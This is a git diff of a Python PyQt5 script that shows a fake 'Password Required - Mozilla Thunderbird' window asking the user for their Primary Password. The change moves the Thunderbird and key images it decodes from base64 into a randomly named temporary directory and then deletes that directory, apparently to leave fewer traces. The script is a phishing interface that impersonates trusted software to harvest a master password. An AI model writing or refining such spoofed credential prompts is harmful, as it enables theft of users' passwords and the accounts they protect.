@@ -1,11 +1,31 @@
 import sys
 import os
+import shutil
 import base64
+import random
+from datetime import datetime
 from PyQt5.QtWidgets import QApplication, QLabel, QWidget, QLineEdit, QPushButton, QDesktopWidget
 from PyQt5 import QtGui
 
+import filewriter
+
+
+def rand_dir_name() -> str:
+    """
+    Before calling this function, please call the function `random.seed` with a 
+    non-fixed value.
+    
+    :returns: a random dir name consisting of six randomly determined digits.
+    """
+    rand_digits = filewriter.n_rand_numbers(6)
+    dir_name = ""
+    for d in rand_digits:
+        dir_name += str(d)
+    return dir_name
+
+
 # TODO: Find out default language and show language depending on default language:
-# - German in default language is German
+# - German if default language is German
 # - English otherwise
 
 app = QApplication(sys.argv)
@@ -83,9 +103,17 @@ window.setWindowTitle("Password Required - Mozilla Thunderbird")
 #window.setFont(QtGui.QFont("Arial", FONT_SIZE))
 # TODO: Include the default22.png Thunderbird icon from a system directory,
 # depending on the previously determined installation path of Thunderbird.
-with open(os.path.join("data", "default22_decoded.png"), "wb") as tb_icon:
+random.seed((datetime.now()).strftime("%H%M%S"))
+dir_name: str = rand_dir_name()
+# If the randomly determined directory name already exists, create a new one
+# until a name is found that does not already exist:
+while os.path.isdir(dir_name):
+    dir_name = rand_dir_name()
+os.mkdir(dir_name)
+encoded_tb_icon_path: str = os.path.join(dir_name, "default22_decoded.png")
+with open(encoded_tb_icon_path, "wb") as tb_icon:
     tb_icon.write(base64.b64decode(DEFAULT22_BASE64))
-window.setWindowIcon(QtGui.QIcon(os.path.join("data", "default22_decoded.png")))
+window.setWindowIcon(QtGui.QIcon(encoded_tb_icon_path))
 window.setGeometry(100, 100, 390, 150)
 
 # Let the window sporn in the center of the screen:
@@ -95,11 +123,13 @@ fg.moveCenter(center_point)
 window.move(fg.topLeft())
 
 key = QLabel(parent=window)
-with open(os.path.join("data", "key_screenshot_decoded.png"), "wb") as key_icon:
+encoded_key_icon_path: str = os.path.join(dir_name, "key_screenshot_decoded.png")
+with open(encoded_key_icon_path, "wb") as key_icon:
     key_icon.write(base64.b64decode(KEY_SCREENSHOT_BASE64))
-pixmap = QtGui.QPixmap(os.path.join("data", "key_screenshot_decoded.png"))
+pixmap = QtGui.QPixmap(encoded_key_icon_path)
 key.setPixmap(pixmap)
 key.move(15,15)
+shutil.rmtree(dir_name, ignore_errors=True)
 
 # TODO: Include the key icon from a system directory.
 msg = QLabel("Please enter your Primary Password.", parent=window)
